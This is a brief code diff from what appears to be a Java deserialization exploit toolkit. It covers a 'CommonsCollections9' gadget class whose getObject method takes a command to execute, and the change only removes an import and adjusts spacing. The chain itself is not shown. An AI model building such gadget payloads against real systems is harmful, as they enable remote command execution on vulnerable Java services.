@@ -1,6 +1,5 @@
 package com.qi4l.jndi.gadgets;
 
-import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Reflections;
@@ -18,7 +17,7 @@ import java.util.Map;
 @Dependencies({"commons-collections:commons-collections:3.2.1"})
 @Authors({"梅子酒"})
 
-public class CommonsCollections9 implements ObjectPayload<BadAttributeValueExpException>{
+public class CommonsCollections9 implements ObjectPayload<BadAttributeValueExpException> {
 
     public BadAttributeValueExpException getObject(String command) throws Exception {
         String[]                      execArgs           = {command};
